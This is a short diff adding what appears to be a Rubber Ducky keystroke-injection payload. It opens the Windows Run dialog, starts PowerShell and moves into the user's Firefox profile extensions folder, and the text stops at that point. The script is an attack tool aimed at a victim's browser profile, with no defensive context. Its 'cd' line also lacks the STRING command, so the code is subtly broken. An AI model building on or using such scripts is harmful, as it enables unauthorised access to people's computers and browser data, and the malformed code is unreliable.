@@ -1,0 +1,7 @@
+GUI r
+DELAY 500
+STRING powershell
+ENTER
+DELAY 500
+cd C:\Users\$env:UserName\AppData\Roaming\Mozilla\Firefox\Profiles\*.darwinPROD1\extensions
+ENTER 
